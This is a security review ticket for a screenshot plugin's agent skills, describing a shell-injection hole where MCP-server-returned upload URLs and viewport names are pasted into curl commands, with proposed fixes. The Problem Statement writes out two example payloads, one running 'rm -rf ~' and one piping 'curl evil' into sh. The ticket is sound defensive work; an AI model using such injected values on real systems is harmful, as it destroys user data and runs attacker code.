---
name: Harden curl invocation against malicious/impersonated MCP server responses
description: Signed upload URLs and viewport labels from the MCP server are interpolated directly into a shell command; a single-quote in the server response breaks out of the quote.
type: task
status: complete
priority: p1
issue_id: "003"
tags: [code-review, security, shell-injection]
dependencies: []
---

## Problem Statement

Both capture skills instruct the agent to PUT binary data via shell-invoked `curl`, with untrusted strings from the MCP response interpolated into the command:

`skills/screenote/SKILL.md:117-118`:
```bash
curl -X PUT -H 'Content-Type: image/png' --data-binary @/tmp/screenote-{viewport}.png '<upload_url>'
```

`skills/snapshot/SKILL.md:249`:
```bash
curl -X PUT -H 'Content-Type: image/png' --data-binary @<SNAP_DIR>/<i>-<viewport>.png '<upload_url>'
```

Both `upload_url` and `{viewport}` are server-returned values (the viewport field comes from `uploads[].viewport`). If the MCP server is malicious, compromised, or impersonated:

- A URL containing a single quote (`https://evil/x'; rm -rf ~; echo '`) breaks out of the `'...'` quoting and executes arbitrary shell.
- A viewport string like `a.png'; curl evil|sh; '` does the same, smuggled into the filename.

Pre-signed S3 URLs don't normally contain quotes, but "normally" isn't a security property. The plugin currently trusts the remote server's returned strings absolutely.

## Findings

- **No host/scheme allowlist** for `upload_url` in either skill.
- **No character sanitization** before shelling out.
- **Viewport string comes from the server, not the client**, so the agent cannot assume it's in `{desktop, tablet, mobile}`.

## Proposed Solutions

### Option A (recommended) — Validate before shelling out

Instruct the agent to:
1. Verify the `upload_url` parses as `https://` and its host is in an allowlist (e.g., `screenote-uploads.s3.amazonaws.com`, `*.screenote.ai`). Abort with an error otherwise.
2. Require `uploads[i].viewport` to be exactly one of `desktop`, `tablet`, `mobile`. Reject otherwise.
3. Use the validated viewport string for the filename; keep the URL in a shell variable and reference it as `"$UPLOAD_URL"`:
   ```bash
   UPLOAD_URL='<validated-url>'
   curl -X PUT -H 'Content-Type: image/png' --data-binary @"$FILE" "$UPLOAD_URL"
   ```

- Pros: closes both injection vectors, tiny instruction change.
- Cons: agent has to do string validation it currently doesn't; requires publishing the allowlist.
- Effort: Small.
- Risk: Low.

### Option B — Use a non-shell upload path

Replace `curl` with a native Playwright/MCP upload primitive, or write the URL to a file and pass `curl -K`. Avoids shell interpolation entirely.

- Pros: strongest guarantee.
- Cons: depends on a primitive that may not exist; larger change.
- Effort: Medium-Large.
- Risk: Medium.

## Recommended Action

Option A in this PR. Revisit Option B as a follow-up if the primitive exists.

## Technical Details

- **Affected files:** `skills/screenote/SKILL.md`, `skills/snapshot/SKILL.md`
- **Threat model:** Compromised or impersonated MCP server; `.mcp.json` already honors `SCREENOTE_URL` env override, so an attacker who can set that env var can impersonate.

## Acceptance Criteria

- [ ] Both SKILLs instruct the agent to validate `upload_url` host before PUT
- [ ] Both SKILLs constrain `viewport` to the known set before using in filenames
- [ ] Both SKILLs use a shell-variable form for the URL rather than inline interpolation

## Work Log

_(empty)_

## Resources

- PR: https://github.com/ivankuznetsov/claude-screenote/pull/5
